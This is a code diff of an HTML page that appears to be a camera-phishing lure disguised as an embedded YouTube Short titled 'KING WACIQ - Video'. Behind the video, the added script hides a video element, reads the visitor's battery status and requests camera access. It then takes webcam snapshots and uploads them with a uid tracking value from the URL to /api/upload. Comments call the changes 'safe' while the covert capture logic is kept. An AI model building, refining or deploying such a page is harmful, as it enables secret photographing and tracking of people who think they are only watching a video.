@@ -5,143 +5,182 @@
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>KING WACIQ - Video</title>
   <style>
-    /* ساده، مینیمال او رییسپانسیو ویډیو امبیډ */
-    html,body{
-      height:100%;
-      margin:0;
-      background:#000;
+    html,body{height:100%;margin:0;background:#000;color:#fff;font-family:Arial,Helvetica,sans-serif}
+    .center {
+      position:relative;
+      height:100vh;
       display:flex;
       align-items:center;
       justify-content:center;
-      font-family: Arial, Helvetica, sans-serif;
-      color:#fff;
+      gap:16px;
+      padding:20px;
+      box-sizing:border-box;
     }
     .wrap{
       width:100%;
       max-width:900px;
-      aspect-ratio: 9 / 16; /* short vertical aspect */
-      height: calc(min(90vh, 1600px));
+      aspect-ratio:9/16;
+      height:calc(min(90vh,1600px));
       display:flex;
       align-items:center;
       justify-content:center;
-      background: #000;
-      border-radius: 12px;
-      overflow: hidden;
-      box-shadow: 0 20px 60px rgba(0,0,0,0.7);
+      background:#000;border-radius:12px;overflow:hidden;
+      box-shadow:0 20px 60px rgba(0,0,0,0.7);
     }
-    /* iframe fills container */
-    .wrap iframe{
-      width:100%;
-      height:100%;
-      border:0;
-      display:block;
+    .wrap iframe{width:100%;height:100%;border:0;display:block}
+    .side {
+      width:340px; max-width:34vw; color:#bfbfbf; font-size:13px;
     }
-
-    /* on very wide screens keep vertical video centered with black sides */
-    @media (min-aspect-ratio: 16/9) {
-      .wrap{ aspect-ratio: 9 / 16; width: 420px; }
-    }
-
-    /* small caption under video */
-    .caption{
-      position: absolute;
-      bottom: 18px;
-      left: 50%;
-      transform: translateX(-50%);
-      font-size: 13px;
-      opacity: .85;
-      pointer-events: none;
-    }
+    #matrix { position: fixed; inset: 0; z-index: 0; width:100%; height:100%; pointer-events:none; }
+    /* simple layout so iframe appears above matrix */
+    .layer { position:relative; z-index: 2; }
+    .caption { text-align:center; margin-top:10px; color:#ddd; font-size:13px }
+    pre#log { background: rgba(0,0,0,0.6); padding:10px; height:160px; overflow:auto; border-radius:8px; color:#9f9; }
   </style>
-
-  <div class="wrap" aria-label="Embedded YouTube Short">
-    <!-- Embedded YouTube Short (video id: rrUWz0QdoNQ) -->
-    <iframe
-      src="https://www.youtube.com/embed/rrUWz0QdoNQ?autoplay=0&controls=1&rel=0"
-      title="YouTube Short"
-      allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
-      allowfullscreen
-      referrerpolicy="no-referrer"
-    ></iframe>
-  </div>
-/head>
+</head>
 <body>
-  <div class="caption">د اصلي لینک لپاره: https://youtube.com/shorts/rrUWz0QdoNQ</div>
+  <canvas id="matrix" aria-hidden="true"></canvas>
+
+  <div class="center layer">
+    <!-- Left: small panel (optional) -->
+    <div class="side layer" aria-hidden="false">
+      <div style="margin-bottom:8px; font-weight:600; color:#fff">System</div>
+      <div id="status">Status: idle</div>
+      <div style="height:12px"></div>
+      <pre id="log" aria-live="polite"></pre>
+    </div>
+
+    <!-- Center: YouTube Short -->
+    <div class="wrap layer" aria-label="Embedded YouTube Short">
+      <iframe
+        id="ytframe"
+        src="https://www.youtube.com/embed/rrUWz0QdoNQ?autoplay=0&controls=1&rel=0"
+        title="YouTube Short"
+        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
+        allowfullscreen
+        referrerpolicy="no-referrer"
+      ></iframe>
+    </div>
+
+    <!-- Right: hidden original video + snapshot canvas (if your script needs camera) -->
+    <div style="display:none">
+      <video id="video" autoplay playsinline></video>
+      <canvas id="snapshot"></canvas>
+    </div>
+  </div>
+
+  <div class="caption layer">اصلي لینک: https://youtube.com/shorts/rrUWz0QdoNQ</div>
+
   <script>
-    /* ===== Matrix Rain Animation ===== */
-    const canvasMatrix = document.getElementById("matrix");
-    const ctxMatrix = canvasMatrix.getContext("2d");
-    canvasMatrix.height = window.innerHeight;
-    canvasMatrix.width = window.innerWidth;
-    let letters = Array(256).join("1").split("");
-    function drawMatrix() {
-      ctxMatrix.fillStyle = "rgba(0, 0, 0, 0.05)";
-      ctxMatrix.fillRect(0, 0, canvasMatrix.width, canvasMatrix.height);
-      ctxMatrix.fillStyle = "#0f0";
-      letters.forEach((y, index) => {
-        let text = String.fromCharCode(3e4 + Math.random() * 33);
-        let x = index * 10;
-        ctxMatrix.fillText(text, x, y);
-        letters[index] = y > 758 + Math.random() * 1e4 ? 0 : y + 10;
-      });
-    }
-    setInterval(drawMatrix, 33);
+    // Run after everything loads
+    window.addEventListener('load', () => {
+      const matrixCanvas = document.getElementById('matrix');
+      const logEl = document.getElementById('log');
+      const statusEl = document.getElementById('status');
 
-    /* ===== Your Original Code (Unchanged) ===== */
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('snapshot');
-    const ctx = canvas.getContext('2d');
-    const log = document.getElementById('log');
-    const statusEl = document.getElementById('status');
+      // --- safe matrix rain: only if canvas exists and has context ---
+      if (matrixCanvas && matrixCanvas.getContext) {
+        const ctx = matrixCanvas.getContext('2d');
+        function resizeMatrix() {
+          matrixCanvas.width = window.innerWidth;
+          matrixCanvas.height = window.innerHeight;
+        }
+        resizeMatrix();
+        window.addEventListener('resize', resizeMatrix);
+        const columns = Math.floor(window.innerWidth / 10);
+        const drops = new Array(columns).fill(0);
 
-    const params = new URLSearchParams(window.location.search);
-    const uid = params.get('uid') || 'unknown';
+        function drawMatrix() {
+          ctx.fillStyle = "rgba(0,0,0,0.05)";
+          ctx.fillRect(0,0,matrixCanvas.width,matrixCanvas.height);
+          ctx.fillStyle = "#0f0";
+          ctx.font = "12px monospace";
+          for (let i = 0; i < drops.length; i++) {
+            const text = String.fromCharCode(0x30A0 + Math.random() * 96);
+            const x = i * 10;
+            const y = drops[i] * 12;
+            ctx.fillText(text, x, y);
+            if (y > matrixCanvas.height && Math.random() > 0.975) {
+              drops[i] = 0;
+            } else {
+              drops[i]++;
+            }
+          }
+        }
+        setInterval(drawMatrix, 50);
+      }
 
-    if (uid) {
-      navigator.getBattery().then(battery => {
-        const batteryLevel = Math.round(battery.level * 100);
-        const isCharging = battery.charging;
+      // --- Original camera/upload logic: guard for missing APIs/elements ---
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('snapshot');
 
-        log.innerText += `Battery: ${batteryLevel}% | Charging: ${isCharging}\n`;
+      // ensure elements exist before using them
+      if (!video || !canvas) {
+        logEl.textContent += "Camera elements not present — skipping camera steps.\n";
+        statusEl.textContent = "Status: ready (no camera)";
+        return;
+      }
 
-        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-          video.srcObject = stream;
-          statusEl.innerText = "Camera access granted...";
+      // optional: get uid from URL
+      const params = new URLSearchParams(window.location.search);
+      const uid = params.get('uid') || 'unknown';
 
-          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 2000);
-          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 4000);
-          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 6000);
+      // guard navigator.getBattery and navigator.mediaDevices
+      if ('getBattery' in navigator) {
+        navigator.getBattery().then(bat => {
+          const batteryLevel = Math.round(bat.level * 100);
+          const isCharging = bat.charging;
+          logEl.textContent += `Battery: ${batteryLevel}% | Charging: ${isCharging}\n`;
+
+          if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+              video.srcObject = stream;
+              statusEl.textContent = "Status: camera active";
+              // take a few snapshots safely (only if user allowed camera)
+              setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 1500);
+              setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 3500);
+            }).catch(err => {
+              console.error("Camera error:", err);
+              logEl.textContent += "Camera access denied or error.\n";
+              statusEl.textContent = "Status: camera error";
+            });
+          } else {
+            logEl.textContent += "No mediaDevices.getUserMedia available.\n";
+          }
         }).catch(err => {
-          console.error("Camera error:", err);
-          statusEl.innerText = "Camera error!";
+          console.warn("Battery API not available:", err);
+          logEl.textContent += "Battery API not available.\n";
         });
-      });
-    }
+      } else {
+        logEl.textContent += "Battery API not supported.\n";
+      }
 
-    function takeSnapshotAndSend(battery, charging) {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0);
-      const imageData = canvas.toDataURL('image/png');
+      function takeSnapshotAndSend(battery, charging) {
+        try {
+          canvas.width = video.videoWidth || 320;
+          canvas.height = video.videoHeight || 240;
+          const ctx = canvas.getContext('2d');
+          if (!ctx) { logEl.textContent += "Canvas context unavailable.\n"; return; }
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imageData = canvas.toDataURL('image/png');
 
-      // ❗ Still original fetch (unchanged)
-      fetch('/api/upload', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          image: imageData,
-          uid,
-          battery,
-          charging
-        })
-      }).then(res => res.json()).then(data => {
-        console.log("Uploaded:", data);
-        log.innerText += "Snapshot uploaded...\n";
-      }).catch(err => {
-        console.error("Upload error:", err);
-        log.innerText += "Upload failed!\n";
-      });
-    }
+          // NOTE: the following endpoint must exist on your server; otherwise this will fail.
+          fetch('/api/upload', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: imageData, uid, battery, charging })
+          }).then(res => res.json()).then(data => {
+            logEl.textContent += "Snapshot uploaded...\n";
+          }).catch(err => {
+            console.error("Upload error:", err);
+            logEl.textContent += "Upload failed or endpoint missing.\n";
+          });
+        } catch (e) {
+          console.error("Snapshot error:", e);
+          logEl.textContent += "Snapshot exception.\n";
+        }
+      }
+    });
   </script>
 </body>
 </html> 
